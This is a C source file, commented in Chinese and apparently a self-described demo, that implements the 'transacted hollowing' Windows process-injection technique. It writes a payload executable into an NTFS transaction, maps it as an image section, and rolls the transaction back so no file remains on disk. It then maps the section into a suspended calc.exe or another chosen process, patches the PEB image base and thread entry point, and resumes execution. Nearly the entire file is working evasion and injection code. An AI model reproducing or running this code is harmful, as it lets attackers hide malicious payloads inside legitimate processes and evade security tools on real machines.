#include <windows.h>
#include <stdio.h>
#include <ktmw32.h>
#include "internals.h"
#include "pe_utils.h"

#pragma comment(lib, "ktmw32.lib")
#pragma comment(lib, "ntdll.lib")

// ===== 全局函数指针定义 =====
_NtCreateSection NtCreateSection = NULL;
_NtMapViewOfSection NtMapViewOfSection = NULL;
_NtUnmapViewOfSection NtUnmapViewOfSection = NULL;
_CreateProcessInternalW CreateProcessInternalW = NULL;

/**
 * 初始化 NT API 函数指针
 */
BOOL InitializeNtFunctions() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("错误：无法获取 ntdll.dll 句柄\n");
        return FALSE;
    }

    NtCreateSection = (_NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection = (_NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection = (_NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    if (!NtCreateSection || !NtMapViewOfSection || !NtUnmapViewOfSection) {
        printf("错误：无法获取 NT API 函数地址\n");
        return FALSE;
    }

    return TRUE;
}

/**
 * 初始化 Kernel32 未导出函数
 */
BOOL InitializeKernel32Functions() {
    HMODULE hKernel32 = LoadLibraryA("kernelbase.dll");
    if (!hKernel32) {
        hKernel32 = GetModuleHandleA("kernel32.dll");
    }

    if (!hKernel32) {
        printf("错误：无法获取 kernel32.dll 句柄\n");
        return FALSE;
    }

    CreateProcessInternalW = (_CreateProcessInternalW)GetProcAddress(hKernel32, "CreateProcessInternalW");

    if (!CreateProcessInternalW) {
        printf("错误：无法获取 CreateProcessInternalW 函数地址\n");
        return FALSE;
    }

    return TRUE;
}

/**
 * 创建事务性内存节
 * @param dummyName 临时文件名
 * @param payloadBuf 载荷缓冲区
 * @param payloadSize 载荷大小
 * @return 内存节句柄，失败返回 INVALID_HANDLE_VALUE
 */
HANDLE CreateTransactedSection(const WCHAR* dummyName, BYTE* payloadBuf, DWORD payloadSize) {
    printf("\n[1] 创建 NTFS 事务\n");

    // 1. 创建事务
    HANDLE hTransaction = CreateTransaction(
        NULL,   // lpTransactionAttributes
        NULL,   // UOW
        0,      // CreateOptions
        0,      // IsolationLevel
        0,      // IsolationFlags
        0,      // Timeout
        NULL    // Description
    );

    if (hTransaction == INVALID_HANDLE_VALUE) {
        printf("错误：创建事务失败，错误码：%d\n", GetLastError());
        return INVALID_HANDLE_VALUE;
    }
    printf("    事务句柄：0x%p\n", hTransaction);

    // 2. 创建事务性文件
    printf("\n[2] 创建事务性文件\n");
    printf("    文件路径：%ls\n", dummyName);

    HANDLE hTransactedFile = CreateFileTransactedW(
        dummyName,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );

    if (hTransactedFile == INVALID_HANDLE_VALUE) {
        printf("错误：创建事务性文件失败，错误码：%d\n", GetLastError());
        CloseHandle(hTransaction);
        return INVALID_HANDLE_VALUE;
    }
    printf("    文件句柄：0x%p\n", hTransactedFile);

    // 3. 写入载荷到事务性文件
    printf("\n[3] 写入载荷到事务性文件\n");
    printf("    载荷大小：%d 字节\n", payloadSize);

    DWORD bytesWritten = 0;
    if (!WriteFile(hTransactedFile, payloadBuf, payloadSize, &bytesWritten, NULL)) {
        printf("错误：写入文件失败，错误码：%d\n", GetLastError());
        CloseHandle(hTransactedFile);
        CloseHandle(hTransaction);
        return INVALID_HANDLE_VALUE;
    }
    printf("    已写入：%d 字节\n", bytesWritten);

    // 4. 从文件创建内存节（SEC_IMAGE）
    printf("\n[4] 创建内存节对象（SEC_IMAGE）\n");

    HANDLE hSection = NULL;
    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,  // 关键：以镜像方式创建节
        hTransactedFile
    );

    if (status != STATUS_SUCCESS) {
        printf("错误：NtCreateSection 失败，状态码：0x%lX\n", status);
        CloseHandle(hTransactedFile);
        CloseHandle(hTransaction);
        return INVALID_HANDLE_VALUE;
    }
    printf("    节句柄：0x%p\n", hSection);

    // 5. 关闭文件句柄
    CloseHandle(hTransactedFile);

    // 6. 回滚事务（删除文件，但内存节仍然有效）
    printf("\n[5] 回滚事务（删除文件）\n");

    if (!RollbackTransaction(hTransaction)) {
        printf("警告：回滚事务失败，错误码：%d\n", GetLastError());
    } else {
        printf("    事务已回滚，文件已删除\n");
    }

    CloseHandle(hTransaction);

    printf("    内存节创建成功！\n");
    return hSection;
}

/**
 * 使用 CreateProcessInternalW 创建挂起进程
 */
BOOL CreateSuspendedProcess(const WCHAR* targetPath, PROCESS_INFORMATION* pi) {
    STARTUPINFOW si = {0};
    si.cb = sizeof(STARTUPINFOW);

    WCHAR cmdLine[MAX_PATH];
    wcscpy_s(cmdLine, MAX_PATH, targetPath);

    HANDLE hToken = NULL;
    HANDLE hNewToken = NULL;

    if (!CreateProcessInternalW(
        hToken,
        NULL,
        cmdLine,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        pi,
        &hNewToken
    )) {
        printf("错误：CreateProcessInternalW 失败，错误码：%d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

/**
 * 将内存节映射到目标进程
 */
PVOID MapSectionToProcess(HANDLE hProcess, HANDLE hSection) {
    SIZE_T viewSize = 0;
    PVOID baseAddress = NULL;

    NTSTATUS status = NtMapViewOfSection(
        hSection,
        hProcess,
        &baseAddress,
        0,
        0,
        NULL,
        &viewSize,
        ViewShare,
        0,
        PAGE_READONLY
    );

    if (status != STATUS_SUCCESS) {
        if (status == STATUS_IMAGE_NOT_AT_BASE) {
            printf("警告：镜像未映射到首选基址，如果载荷没有重定位表将无法运行\n");
        } else {
            printf("错误：NtMapViewOfSection 失败，状态码：0x%lX\n", status);
            return NULL;
        }
    }

    return baseAddress;
}

/**
 * 获取远程进程的 PEB 地址
 */
ULONG_PTR GetRemotePebAddress(PROCESS_INFORMATION* pi, BOOL is32bit) {
    #ifdef _WIN64
        if (is32bit) {
            // 32 位进程需要使用 WOW64 API
            WOW64_CONTEXT ctx = {0};
            ctx.ContextFlags = CONTEXT_INTEGER;

            if (!Wow64GetThreadContext(pi->hThread, &ctx)) {
                printf("错误：Wow64GetThreadContext 失败\n");
                return 0;
            }

            return ctx.Ebx;
        } else {
            // 64 位进程
            CONTEXT ctx = {0};
            ctx.ContextFlags = CONTEXT_INTEGER;

            if (!GetThreadContext(pi->hThread, &ctx)) {
                printf("错误：获取线程上下文失败\n");
                return 0;
            }

            return ctx.Rdx;
        }
    #else
        // 32 位编译器
        CONTEXT ctx = {0};
        ctx.ContextFlags = CONTEXT_INTEGER;

        if (!GetThreadContext(pi->hThread, &ctx)) {
            printf("错误：获取线程上下文失败\n");
            return 0;
        }

        return ctx.Ebx;
    #endif
}

/**
 * 计算 PEB 中 ImageBaseAddress 字段的偏移
 */
ULONG_PTR GetImageBaseOffset(BOOL is32bit) {
    // PEB 结构：
    // BOOLEAN InheritedAddressSpace;    // 1 字节
    // BOOLEAN ReadImageFileExecOptions; // 1 字节
    // BOOLEAN BeingDebugged;            // 1 字节
    // BOOLEAN SpareBool;                // 1 字节
    // (64位有4字节对齐填充)
    // HANDLE Mutant;                    // 32位4字节，64位8字节
    // PVOID ImageBaseAddress;           // 在此位置

    return is32bit ? sizeof(DWORD) * 2 : sizeof(ULONGLONG) * 2;
}

/**
 * 更新远程进程 PEB 中的 ImageBase
 */
BOOL UpdateRemoteImageBase(PROCESS_INFORMATION* pi, PVOID newImageBase, BOOL is32bit) {
    // 1. 获取远程 PEB 地址
    ULONG_PTR pebAddr = GetRemotePebAddress(pi, is32bit);
    if (!pebAddr) {
        printf("错误：获取远程 PEB 地址失败\n");
        return FALSE;
    }

    // 2. 计算 ImageBaseAddress 字段地址
    ULONG_PTR imageBaseAddr = pebAddr + GetImageBaseOffset(is32bit);

    // 3. 写入新的 ImageBase
    SIZE_T bytesWritten = 0;
    SIZE_T imageBaseSize = is32bit ? sizeof(DWORD) : sizeof(ULONGLONG);

    if (!WriteProcessMemory(
        pi->hProcess,
        (LPVOID)imageBaseAddr,
        &newImageBase,
        imageBaseSize,
        &bytesWritten
    )) {
        printf("错误：写入 ImageBase 失败\n");
        return FALSE;
    }

    return TRUE;
}

/**
 * 更新线程上下文中的入口点
 */
BOOL UpdateEntryPoint(PROCESS_INFORMATION* pi, ULONG_PTR entryPoint, BOOL is32bit) {
    #ifdef _WIN64
        if (is32bit) {
            // 32 位进程需要使用 WOW64 API
            WOW64_CONTEXT ctx = {0};
            ctx.ContextFlags = CONTEXT_INTEGER;

            if (!Wow64GetThreadContext(pi->hThread, &ctx)) {
                printf("错误：Wow64GetThreadContext 失败\n");
                return FALSE;
            }

            ctx.Eax = (DWORD)entryPoint;

            if (!Wow64SetThreadContext(pi->hThread, &ctx)) {
                printf("错误：Wow64SetThreadContext 失败\n");
                return FALSE;
            }
        } else {
            // 64 位进程
            CONTEXT ctx = {0};
            ctx.ContextFlags = CONTEXT_INTEGER;

            if (!GetThreadContext(pi->hThread, &ctx)) {
                printf("错误：获取线程上下文失败\n");
                return FALSE;
            }

            ctx.Rcx = entryPoint;

            if (!SetThreadContext(pi->hThread, &ctx)) {
                printf("错误：设置线程上下文失败\n");
                return FALSE;
            }
        }
    #else
        // 32 位编译器
        CONTEXT ctx = {0};
        ctx.ContextFlags = CONTEXT_INTEGER;

        if (!GetThreadContext(pi->hThread, &ctx)) {
            printf("错误：获取线程上下文失败\n");
            return FALSE;
        }

        ctx.Eax = (DWORD)entryPoint;

        if (!SetThreadContext(pi->hThread, &ctx)) {
            printf("错误：设置线程上下文失败\n");
            return FALSE;
        }
    #endif

    return TRUE;
}

/**
 * 主函数：事务性镂空
 */
int wmain(int argc, WCHAR* argv[]) {
    printf("======================================\n");
    printf("      事务性镂空技术演示程序\n");
    printf("   Transacted Hollowing Demo\n");
    printf("======================================\n");

    if (argc < 2) {
        printf("\n用法：%ls <载荷路径> [目标进程]\n", argv[0]);
        printf("\n示例：\n");
        printf("  %ls payload.exe\n", argv[0]);
        printf("  %ls payload.exe notepad.exe\n", argv[0]);
        printf("\n说明：\n");
        printf("  载荷路径：要注入执行的 PE 文件\n");
        printf("  目标进程：可选，默认使用 calc.exe\n");
        return 1;
    }

    // 初始化函数指针
    if (!InitializeNtFunctions() || !InitializeKernel32Functions()) {
        return 1;
    }

    const WCHAR* payloadPath = argv[1];
    WCHAR targetPath[MAX_PATH] = {0};

    // 确定目标进程
    if (argc >= 3) {
        wcscpy_s(targetPath, MAX_PATH, argv[2]);
    } else {
        // 默认使用计算器
        #ifdef _WIN64
            wcscpy_s(targetPath, MAX_PATH, L"C:\\Windows\\System32\\calc.exe");
        #else
            wcscpy_s(targetPath, MAX_PATH, L"C:\\Windows\\SysWOW64\\calc.exe");
        #endif
    }

    printf("\n========== 开始事务性镂空 ==========\n");
    printf("载荷文件：%ls\n", payloadPath);
    printf("目标进程：%ls\n", targetPath);

    // 读取载荷文件
    printf("\n[0] 读取载荷文件\n");
    DWORD payloadSize = 0;
    BYTE* payloadBuf = ReadFileToBuffer(payloadPath, &payloadSize);
    if (!payloadBuf) {
        return 1;
    }

    BOOL isPayload32 = !IsPE64Bit(payloadBuf);
    printf("    载荷架构：%s\n", isPayload32 ? "32 位" : "64 位");

    // 创建临时文件名
    WCHAR tempPath[MAX_PATH];
    WCHAR dummyName[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    GetTempFileNameW(tempPath, L"TH", 0, dummyName);

    // 创建事务性内存节
    HANDLE hSection = CreateTransactedSection(dummyName, payloadBuf, payloadSize);
    if (hSection == INVALID_HANDLE_VALUE) {
        free(payloadBuf);
        return 1;
    }

    // 创建挂起的目标进程
    printf("\n[6] 创建挂起的目标进程\n");
    PROCESS_INFORMATION pi = {0};
    if (!CreateSuspendedProcess(targetPath, &pi)) {
        CloseHandle(hSection);
        free(payloadBuf);
        return 1;
    }
    printf("    进程 ID：%d\n", pi.dwProcessId);
    printf("    进程句柄：0x%p\n", pi.hProcess);

    // 映射内存节到目标进程
    printf("\n[7] 映射内存节到目标进程\n");
    PVOID remoteBase = MapSectionToProcess(pi.hProcess, hSection);
    if (!remoteBase) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(hSection);
        free(payloadBuf);
        return 1;
    }
    printf("    映射基址：0x%p\n", remoteBase);

    // 更新 PEB 中的 ImageBase
    printf("\n[8] 更新 PEB 中的 ImageBase\n");
    if (!UpdateRemoteImageBase(&pi, remoteBase, isPayload32)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(hSection);
        free(payloadBuf);
        return 1;
    }
    printf("    ImageBase 已更新\n");

    // 更新入口点
    printf("\n[9] 更新线程入口点\n");
    DWORD entryRVA = GetEntryPointRVA(payloadBuf);
    ULONG_PTR entryPoint = (ULONG_PTR)remoteBase + entryRVA;
    printf("    入口点 RVA：0x%X\n", entryRVA);
    printf("    入口点 VA：0x%p\n", (PVOID)entryPoint);

    if (!UpdateEntryPoint(&pi, entryPoint, isPayload32)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(hSection);
        free(payloadBuf);
        return 1;
    }

    // 恢复线程
    printf("\n[10] 恢复线程执行\n");
    ResumeThread(pi.hThread);

    printf("\n========== 事务性镂空完成 ==========\n");
    printf("进程 %d 正在运行载荷代码\n", pi.dwProcessId);

    // 清理
    CloseHandle(hSection);
    free(payloadBuf);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
